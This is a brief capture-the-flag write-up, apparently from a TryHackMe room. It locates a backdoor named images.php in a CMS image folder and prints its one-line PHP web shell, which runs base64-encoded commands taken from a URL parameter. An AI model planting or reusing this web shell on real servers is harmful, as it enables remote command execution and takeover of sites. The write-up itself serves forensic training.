# Soluce

We will search in the `img` directory to find a backdoor file:

```sh
ubuntu@tryhackme:~$ find /var/www/html/CMSsite-master/img/ -name "*.php"
/var/www/html/CMSsite-master/img/images.php
```

We can see that the attacker has uploaded a PHP web shell named `images.php`. We can access the web shell by visiting the following URL:

```sh
ubuntu@tryhackme:~$ cat /var/www/html/CMSsite-master/img/images.php
<?php system(base64_decode($_GET['query'])); ?>
```

The web shell allows us to execute commands on the server by passing them as a base64-encoded query parameter.
